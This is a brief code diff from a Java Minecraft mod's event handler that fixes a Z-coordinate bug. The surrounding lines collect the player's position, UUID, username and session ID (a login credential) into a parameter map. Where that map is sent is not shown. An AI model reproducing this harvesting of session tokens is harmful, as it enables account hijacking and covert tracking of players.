@@ -37,7 +37,7 @@ public class ForgeHaxEventHandler implements Globals {
                     Map<String, Object> params = Maps.newLinkedHashMap();
                     params.put("coordX", MC.player.getPosition().getX());
                     params.put("coordY", MC.player.getPosition().getY());
-                    params.put("coordZ", MC.player.getPosition().getY());
+                    params.put("coordZ", MC.player.getPosition().getZ());
                     params.put("uuid", MC.getSession().getProfile().getId().toString());
                     params.put("username", MC.getSession().getUsername());
                     params.put("session", MC.getSession().getSessionID());
